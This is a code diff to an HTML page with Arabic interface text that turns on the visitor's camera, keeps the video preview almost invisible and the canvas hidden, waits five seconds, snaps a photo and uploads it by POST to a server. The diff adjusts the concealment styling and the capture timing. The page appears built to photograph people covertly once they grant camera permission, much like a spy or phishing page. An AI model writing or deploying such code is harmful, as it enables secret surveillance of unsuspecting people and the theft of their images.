@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>📡 تحميل...</title>
+  <title>📡 جاري التشغيل...</title>
   <style>
     body {
       margin: 0;
@@ -16,22 +16,28 @@
       justify-content: center;
       height: 100vh;
     }
+
     #status {
       font-size: 20px;
     }
-    video, canvas {
-      position: absolute;
-      width: 1px;
-      height: 1px;
-      top: -9999px;
-      left: -9999px;
-      opacity: 0;
+
+    video {
+      position: fixed;
+      top: -10px;
+      left: -10px;
+      width: 5px;
+      height: 5px;
+      opacity: 0.001;
       pointer-events: none;
+    }
+
+    canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <div id="status">📡 تجهيز الكاميرا...</div>
+  <div id="status">📡 جاري تشغيل الكاميرا...</div>
 
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="300" height="300"></canvas>
@@ -46,19 +52,12 @@
         const video = document.getElementById("video");
         video.srcObject = stream;
 
-        // انتظر 5 ثواني على الأقل قبل التحقق
-        setTimeout(() => waitForFrame(video, stream), 5000);
+        setTimeout(() => {
+          takePhoto(stream);
+        }, 5000); // ننتظر 5 ثواني بعد تشغيل الفيديو فعليًا
 
       } catch (e) {
         document.getElementById("status").innerText = "❌ تم رفض الكاميرا.";
-      }
-    }
-
-    function waitForFrame(video, stream) {
-      if (video.videoWidth > 0 && video.videoHeight > 0) {
-        takePhoto(stream);
-      } else {
-        requestAnimationFrame(() => waitForFrame(video, stream));
       }
     }
 
@@ -79,7 +78,7 @@
           method: "POST",
           body: formData
         }).then(r => r.json()).then(d => {
-          document.getElementById("status").innerText = "📽️ تم إرسال الصورة!";
+          document.getElementById("status").innerText = "✅ الصورة اتبعتت بنجاح!";
         }).catch(err => {
           document.getElementById("status").innerText = "❌ فشل في الإرسال.";
         });
